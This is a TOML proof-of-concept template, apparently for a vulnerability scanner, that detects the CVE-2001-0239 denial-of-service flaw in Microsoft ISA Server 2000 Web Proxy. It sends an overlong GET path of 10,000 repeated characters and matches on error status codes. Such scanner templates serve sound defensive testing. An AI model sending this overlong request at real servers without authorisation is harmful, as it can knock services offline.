[info]
author = "ave"
description = "检测 Microsoft ISA Server 2000 Web Proxy 是否存在拒绝服务漏洞。通过发送超长 HTTP 请求检测目标是否容易受到 CVE-2001-0239 攻击。"
id = "POC-AVE-2001-0096"
name = "Microsoft ISA Server 2000 Web Proxy DoS PoC"
severity = "high"
tags = ["ave-2001-0096"]
vuln_id = [
    "CVE-2001-0239",
    "AVE-2001-0096",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{repeat(10000)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    414,
    500,
    502,
    503,
]
type = "status"
